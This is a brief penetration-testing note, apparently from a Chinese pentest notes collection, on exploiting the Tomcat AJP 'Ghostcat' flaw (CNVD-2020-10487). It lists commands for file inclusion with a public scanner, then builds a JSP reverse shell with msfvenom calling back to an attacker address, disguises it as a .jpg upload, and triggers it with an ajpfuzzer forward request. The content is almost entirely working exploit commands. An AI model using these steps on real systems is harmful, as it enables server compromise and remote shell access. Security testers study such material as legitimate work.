	LFI
	https://github.com/Kit4y/CNVD-2020-10487-Tomcat-Ajp-lfi-Scanner
	>python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.0.110 -p 8009 -f pass
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/41.png)

	RCE
	>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.107 LPORT=12138 R >/var/www/html/1.jpg
	配合目标文件上传传入服务器
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/42.png)

	>java -jar ajpfuzzer_v0.6.jar
	>connect 192.168.0.110 8009
	>forwardrequest 2 "HTTP/1.1" "/index.jsp" 192.168.0.107 192.168.0.107 porto 8009 false "Cookie:AAAA=BBBB","Accept-Encoding:identity" "javax.servlet.include.request_uri:index.jsp","javax.servlet.include.path_info:/1.jpg","javax.servlet.include.servlet_path:/"
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/43.png)
